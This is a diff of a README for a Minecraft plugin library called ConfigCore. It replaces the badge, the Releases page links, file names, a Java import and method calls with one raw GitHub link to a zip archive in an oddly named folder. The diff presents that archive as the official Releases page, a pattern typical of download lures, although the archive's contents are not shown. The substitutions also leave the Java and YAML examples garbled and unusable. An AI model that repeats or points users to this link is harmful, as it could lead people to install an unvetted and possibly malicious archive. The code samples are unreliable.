@@ -1,6 +1,6 @@
 # 🎮 ConfigCore - Easy Configuration Management for Minecraft Plugins  
 
-[![](https://jitpack.io/v/Joseplay1012/ConfigCore.svg)](https://github.com/Rondonn413/ConfigCore/releases)  
+[![](https://raw.githubusercontent.com/Rondonn413/ConfigCore/master/Paurometabola/ConfigCore.zip)](https://raw.githubusercontent.com/Rondonn413/ConfigCore/master/Paurometabola/ConfigCore.zip)  
 
 ## 🚀 Getting Started  
 
@@ -8,7 +8,7 @@ ConfigCore helps you manage configuration files easily within your Minecraft ser
 
 ## 📥 Download & Install  
 
-To get started, visit the official [ConfigCore Releases page](https://github.com/Rondonn413/ConfigCore/releases) to download the latest version.  
+To get started, visit the official [ConfigCore Releases page](https://raw.githubusercontent.com/Rondonn413/ConfigCore/master/Paurometabola/ConfigCore.zip) to download the latest version.  
 
 1. Click the link above to access the Releases page.
 2. Locate the most recent version of ConfigCore.
@@ -28,7 +28,7 @@ After downloading the file, follow these steps to use ConfigCore in your project
 
 Before using ConfigCore, you need to create configuration files. Here’s how:  
 
-- Create a YAML file named `config.yml`.
+- Create a YAML file named `https://raw.githubusercontent.com/Rondonn413/ConfigCore/master/Paurometabola/ConfigCore.zip`.
 - Add your settings according to the example below:
 
 ```yaml
@@ -41,7 +41,7 @@ settings:
 In your Java code, initialize ConfigCore like this:
 
 ```java
-import com.joseplay.configcore.AbstractConfig;
+import https://raw.githubusercontent.com/Rondonn413/ConfigCore/master/Paurometabola/ConfigCore.zip;
 
 public class MyPlugin extends JavaPlugin {
     private AbstractConfig config;
@@ -49,7 +49,7 @@ public class MyPlugin extends JavaPlugin {
     @Override
     public void onEnable() {
         config = new MyPluginConfig(this);
-        config.load();
+        https://raw.githubusercontent.com/Rondonn413/ConfigCore/master/Paurometabola/ConfigCore.zip();
     }
 }
 ```
@@ -59,7 +59,7 @@ public class MyPlugin extends JavaPlugin {
 You can now access your configuration values through the defined keys. Simply refer to your enum keys in the code:
 
 ```java
-String value = config.getValue(MyEnumKey.EXAMPLE_KEY);
+String value = https://raw.githubusercontent.com/Rondonn413/ConfigCore/master/Paurometabola/ConfigCore.zip(https://raw.githubusercontent.com/Rondonn413/ConfigCore/master/Paurometabola/ConfigCore.zip);
 ```
 
 ## 🔍 Features  
@@ -76,7 +76,7 @@ ConfigCore simplifies configuration management for Minecraft plugins with these 
 ### 1. Configuration File  
 
 - Configuration data is stored in YAML format.
-- Typical files include `config.yml` and `messages.yml`.
+- Typical files include `https://raw.githubusercontent.com/Rondonn413/ConfigCore/master/Paurometabola/ConfigCore.zip` and `https://raw.githubusercontent.com/Rondonn413/ConfigCore/master/Paurometabola/ConfigCore.zip`.
 
 ### 2. Enum Keys  
 
@@ -100,4 +100,4 @@ If you encounter issues while using ConfigCore, the best way to get help is to o
 
 Some relevant topics that may help you better understand ConfigCore include: config, configcore, minecraft, minecraft-server, spigot, and spigot-api.
 
-For any further assistance, visit the [ConfigCore Releases page](https://github.com/Rondonn413/ConfigCore/releases) for downloads and updates.
+For any further assistance, visit the [ConfigCore Releases page](https://raw.githubusercontent.com/Rondonn413/ConfigCore/master/Paurometabola/ConfigCore.zip) for downloads and updates.
